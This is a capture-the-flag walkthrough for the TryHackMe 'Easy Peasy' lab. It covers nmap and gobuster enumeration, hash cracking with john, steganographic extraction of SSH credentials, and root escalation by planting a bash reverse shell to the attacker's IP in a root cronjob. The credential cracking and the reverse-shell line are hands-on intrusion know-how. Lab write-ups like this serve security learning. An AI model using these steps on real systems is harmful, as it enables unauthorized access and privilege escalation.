---
title: TryHackMe - Easy Peasy
layout: post
categories:
- TryHackMe
tag:
- nmap,
- gobuster,
- cronjob
image: "/assets/img/easy-peasy.png"
image_alt: easy-peasy
---

Practice using tools such as Nmap and GoBuster to locate a hidden directory to get initial access to a vulnerable machine. Then escalate your privileges through a vulnerable cronjob.

Let's start.

<br>

## 1. Enumeration through Nmap  

Deploy the machine attached to this task and use nmap to enumerate it.

<br>

### 1.1 How many ports are open?

Let's do a nmap scan first.

```
$ nmap -sSCV 10.10.46.132 -p-
```

![nmap](/assets/img/tryhackme/easy-peasy/nmap.png)

Three ports are open. These are **`80/tcp HTTP, 6498/tcp SSH, and 65524/tcp HTTP`**. 

**`Answer: 3`**

<br>
### 1.2 What is the version of nginx? 

Look carefully at port 80.

![nginx](/assets/img/tryhackme/easy-peasy/nginx.png)

**`Answer: 1.16.1`**

<br>

### 1.3 What is running on the highest port?

The highest port is 65524.

![apache](/assets/img/tryhackme/easy-peasy/apache.png)

**`Answer: apache`**

<br>

---

<br>

### 2 Compromising the machine 

Now you've enumerated the machine, answer questions and compromise it!

<br>

### 2.1 Using GoBuster, find flag 1.

I'm visiting the site running on port 80 and I see such a page.

![first-home](/assets/img/tryhackme/easy-peasy/first-home.png)

I checked the source page but couldn't find anything remarkable.

Let's do a gobuster scan and see if we can find anything.

```
$  gobuster dir -u http://10.10.46.132/  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
```

![gobuster-one](/assets/img/tryhackme/easy-peasy/gobuster-one.png)

We found /hidden the directory. I've been looking through the page but couldn't find any flags. I'm scanning this directory with gobuster.

```
$ gobuster dir -u http://10.10.46.132/hidden/  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
```

![whatever](/assets/img/tryhackme/easy-peasy/whatever.png)

Nothing appears on the page. Let's look at the source page. 

![decode](/assets/img/tryhackme/easy-peasy/decode.png)

I see an encrypted text. It looks like base64 code. Let's crack it.

```
$ echo "ZmxhZZ3tmMXJzN19mbDRnfQ==" | base64 -d
```

![encode](/assets/img/tryhackme/easy-peasy/encode.png)

**`Answer: flag{*********}`**

<br>

### 2.2 Further enumerate the machine, what is flag 2? 

For the second flag, we’ll jump to the other web service running on port 65524/tcp. There is a robots.txt file that discloses a hash.

![robots](/assets/img/tryhackme/easy-peasy/robots.png)

**`a18672860d0510e5ab6699730763b250`**

Let's look at the type of hash with hash-identifer.

![id-robots](/assets/img/tryhackme/easy-peasy/id-robots.png)

We found the type MD5. Let's crack it.

I found a site that can crack it online. [Here](https://md5hashing.net/hash)

![cracking-robots](/assets/img/tryhackme/easy-peasy/cracking-robots.png)

![crack-robots](/assets/img/tryhackme/easy-peasy/crack-robots.png)

**`Answer: flag{********}`**

<br>

### 2.3 Crack the hash with easypeasy.txt, What is the flag 3?

When we take a look at Apache, something remarkable emerges.

![flag3](/assets/img/tryhackme/easy-peasy/flag3.png)

let's crack it :9fdafbd64c47471a8f54cd3fc64cd312

![crack-flag3](/assets/img/tryhackme/easy-peasy/crack-flag3.png)

**`Answer: flag{*************************}`**

<br>

### 2.4 What is the hidden directory?

When we go to the source page of the Apache page, we see something like this.

![apache-source](/assets/img/tryhackme/easy-peasy/apache-source.png)

`<p hidden>its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu</p>`

Encrypted using bas62. Let's decrypt using [Cyber Chef](https://gchq.github.io/CyberChef/). 

![crack-one](/assets/img/tryhackme/easy-peasy/crack-one.png)

**`Answer: /n0th1ng3ls3m4tt3r`**

<br>

### 2.5 Using the wordlist that provided to you in this task crack the hash
what is the password?

_Hint: GOST Hash john --wordlist=easypeasy.txt --format=gost hash (optional* Delete duplicated lines,Compare easypeasy.txt to rockyou.txt and delete same words)_

Let's go to [http://10.10.120.186:65524/n0th1ng3ls3m4tt3r/](http://10.10.120.186:65524/n0th1ng3ls3m4tt3r/) . Here is the page that comes up.

![find-dict](/assets/img/tryhackme/easy-peasy/find-dict.png)

Let's check the source of the page.

![dict-source](/assets/img/tryhackme/easy-peasy/dict-source.png)

We found this hash.. `940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81`

First I look at the type with hash-identifier.

![dict-source-id](/assets/img/tryhackme/easy-peasy/dict-source-id.png)

It looks like it was encrypted with Sha-256 but when I tried to crack it it didn't. Let's crack it starting from the clue.

```
$ john --wordlist=easypeasy.txt --format=gost hash.txt
```

![dict-source-crack](/assets/img/tryhackme/easy-peasy/dict-source-crack.png)

**`Answer: **********`**

<br>

### 2.6 What is the password to login to the machine via SSH?

![dict-source](/assets/img/tryhackme/easy-peasy/dict-source.png)

Let's download the picture on the page and see. **`binarycodepixabay.jpg`**

![pixabay](/assets/img/tryhackme/easy-peasy/pixabay.png)

```
$ wget http://10.10.120.186:65524/n0th1ng3ls3m4tt3r/binarycodepixabay.jpg
$ steghide extract -sf binarycodepixabay.jpg
$ cat secrettext.txt
```

![secrettext](/assets/img/tryhackme/easy-peasy/secrettext.png)

We found the username and password. 

**`Username: boring`**

Let's crack the encrypted password first.

![crack-pixabay](/assets/img/tryhackme/easy-peasy/crack-pixabay.png)

**`Answer: iconvertedmypasswordtobinary`**

<br>

### 2.7 What is the user flag?

Let's do ssh login. Remember ssh is running on port 6498.

```
$ ssh -i boring@10.10.120.186 -p- 6498
```

![sshin](/assets/img/tryhackme/easy-peasy/sshin.png)

And we are inside. Let's get the user flag.

![user-flag](/assets/img/tryhackme/easy-peasy/user-flag.png)

We found this **`synt{***********}`**. Let's crack it.

![rot](/assets/img/tryhackme/easy-peasy/rot.png)

<br>

### 2.8 What is the root flag?

We need root privilege . I try `sudo l` first but it doesn't work. Then I check the cron job.

![cron](/assets/img/tryhackme/easy-peasy/cron.png)

We found something useful here. Let's go to the file and do a reverse-shell.

First, let's set up a netcat listener on our own machine.

```
$ nc -nlvp 4444
```

Let's change the file on the target machine.

```
$ nano /var/www/.mysecretcronjob.sh
#!/bin/bash
# i will run as root
bash -i >& /dev/tcp/10.8.86.168/4444 0>&1
```

![secretjob](/assets/img/tryhackme/easy-peasy/secretjob.png)

After waiting for a while, we get root privileges.

![root-in](/assets/img/tryhackme/easy-peasy/root-in.png)

Yes, we have root privileges. Let's get the root flag.

![root-flag](/assets/img/tryhackme/easy-peasy/root-flag.png)


<br>

---

<br>

It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.

<br>
